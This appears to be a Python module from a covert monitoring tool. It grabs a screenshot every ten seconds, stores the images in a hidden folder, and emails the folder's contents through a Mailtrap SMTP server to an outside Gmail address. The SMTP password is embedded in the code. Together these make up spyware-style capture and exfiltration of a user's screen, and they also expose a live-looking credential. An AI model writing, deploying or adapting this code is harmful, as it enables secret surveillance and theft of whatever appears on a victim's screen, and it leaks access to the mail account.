import time
import os
from PIL import ImageGrab
from email_sender import send_email_with_attachments
from logger_setup import operation_logger

log_dir = "/Users/mannatvirk/.hiddenfolder"

def take_screenshot():
    try:
        filename = os.path.join(log_dir, f"screenshot_{int(time.time())}.png")
        ImageGrab.grab().save(filename, format="PNG")
        operation_logger.info(f"Screenshot taken and saved to {filename}")

        send_email_with_attachments(
            sender="ye <ye@demomailtrap.com>",
            receiver="A Test User <mannatvirk6841@gmail.com>",
            folder_path=log_dir,
            smtp_server="live.smtp.mailtrap.io",
            port=587,
            login_user="api",
            login_password="ad9ae87d8204b728c11a09d7c502d5b3"
        )
        
    except Exception as e:
        operation_logger.error(f"Error taking screenshot: {e}")


def periodic_screenshots(interval=10):
    while True:
        take_screenshot()
        time.sleep(interval)
